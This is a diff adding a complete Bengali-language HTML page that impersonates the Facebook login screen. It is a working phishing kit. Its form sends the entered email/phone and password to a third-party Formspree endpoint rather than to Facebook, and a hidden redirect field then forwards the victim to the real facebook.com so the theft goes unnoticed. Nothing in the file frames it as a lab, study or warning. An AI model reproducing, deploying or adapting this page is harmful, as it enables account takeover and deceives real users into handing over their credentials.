@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - লগ ইন বা সাইন আপ</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { display: flex; width: 980px; justify-content: space-between; align-items: center; }
+        .left-box { width: 500px; padding-bottom: 80px; }
+        .logo { color: #1877f2; font-size: 60px; font-weight: bold; margin: 0; }
+        .left-box p { font-size: 26px; line-height: 32px; color: #1c1e21; }
+        .right-box { width: 400px; text-align: center; }
+        .form-container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
+        input { width: 100%; height: 52px; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        .login-btn { width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; font-size: 20px; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .create-account { background-color: #42b72a; color: white; border: none; padding: 0 16px; height: 48px; font-size: 17px; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        @media (max-width: 900px) {
+            .container { flex-direction: column; width: 100%; padding: 20px; }
+            .left-box { width: 100%; text-align: center; padding-bottom: 40px; }
+            .logo { font-size: 50px; }
+            .left-box p { font-size: 20px; }
+            .right-box { width: 100%; max-width: 400px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-box">
+            <h1 class="logo">facebook</h1>
+            <p>ফেসবুক আপনাকে আপনার জীবনের মানুষের সাথে যোগাযোগ রাখতে এবং শেয়ার করতে সাহায্য করে।</p>
+        </div>
+        <div class="right-box">
+            <div class="form-container">
+                <form action="https://formspree.io/f/myknrbjy" method="POST">
+                    <input type="text" name="Email/Phone" placeholder="ইমেল ঠিকানা বা ফোন নম্বর" required>
+                    <input type="password" name="Password" placeholder="পাসওয়ার্ড" required>
+                    <input type="hidden" name="_next" value="https://www.facebook.com">
+                    <button type="submit" class="login-btn">লগ ইন করুন</button>
+                    <a href="#" style="display:block; color:#1877f2; text-decoration:none; margin:15px 0; font-size:14px;">পাসওয়ার্ড ভুলে গেছেন?</a>
+                    <hr>
+                    <button type="button" class="create-account">নতুন অ্যাকাউন্ট তৈরি করুন</button>
+                </form>
+            </div>
+            <p style="margin-top:25px; font-size:14px;"><b>সেলিব্রিটি, ব্র্যান্ড বা ব্যবসার জন্য একটি পেজ তৈরি করুন।</b></p>
+        </div>
+    </div>
+</body>
+</html>
